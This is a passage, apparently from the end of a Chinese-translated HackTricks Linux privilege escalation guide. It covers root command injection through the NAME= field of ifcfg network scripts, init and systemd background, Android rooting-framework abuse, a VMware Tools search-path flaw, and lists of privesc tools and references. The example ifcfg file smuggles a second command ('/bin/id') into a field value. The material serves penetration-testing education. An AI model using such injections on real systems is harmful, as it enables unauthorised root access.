**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够 **写入** 一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **或** 可以 **调整** 一个已有的脚本，那么你的 **system is pwned**。

Network scripts，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们会被 Network Manager (dispatcher.d) 在 Linux 上 ~sourced~。

在我的案例中，这些 network scripts 中的 `NAME=` 属性没有被正确处理。如果名称中有空格，系统将尝试执行空格之后的部分。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 包含 System V init (SysVinit) 的 **scripts**，这是传统的 Linux 服务管理系统。它包括用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过位于 `/etc/rc?.d/` 的符号链接来调用。在 Redhat 系统中，另一个路径为 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联，Upstart 是 Ubuntu 引入的较新的 **service management**，使用配置文件来管理服务。尽管已向 Upstart 过渡，但出于兼容性，SysVinit 脚本仍与 Upstart 配置一起使用。

**systemd** 作为现代的初始化和服务管理器出现，提供了按需启动守护进程、automount 管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（发行版包）和 `/etc/systemd/system/`（管理员修改）中，从而简化系统管理流程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常会 hook 一个 syscall，将有特权的内核功能暴露给 userspace 的 manager。弱的 manager 认证（例如基于 FD-order 的签名检查或糟糕的密码方案）可能允许本地应用冒充 manager，从而在已 root 的设备上提升到 root。更多细节和利用方法见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中的基于 regex 的 service discovery 可以从进程命令行提取二进制路径并在特权上下文中以 -v 执行。过于宽松的匹配模式（例如使用 \S）可能会匹配到攻击者放置在可写位置（例如 /tmp/httpd）中的监听器，导致以 root 身份执行（CWE-426 Untrusted Search Path）。

更多信息及适用于其他 discovery/monitoring 堆栈的通用模式见： 

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
